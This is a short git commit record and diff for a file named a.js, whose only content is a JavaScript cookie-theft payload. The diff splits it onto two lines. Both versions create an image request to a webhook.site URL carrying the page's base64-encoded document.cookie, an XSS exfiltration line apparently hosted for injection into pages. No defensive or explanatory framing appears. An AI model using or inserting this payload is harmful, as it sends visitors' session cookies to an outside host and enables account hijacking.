916bcb26a7d76c49a2f2b4fccd38c6973d57c47f
Polina Nguyen <76943559+shinyluck@users.noreply.github.com>
2024-09-05 15:22:41 +0700

    Update a.js

--- a.js
+++ a.js
@@ -1,1 +1,2 @@
-x = new Image(); x.src = 'https://webhook.site/b6a90b02-3e42-415f-845c-7987df6b8974?data='+btoa(document.cookie);
+x = new Image(); 
+x.src = 'https://webhook.site/b6a90b02-3e42-415f-845c-7987df6b8974?data='+btoa(document.cookie);
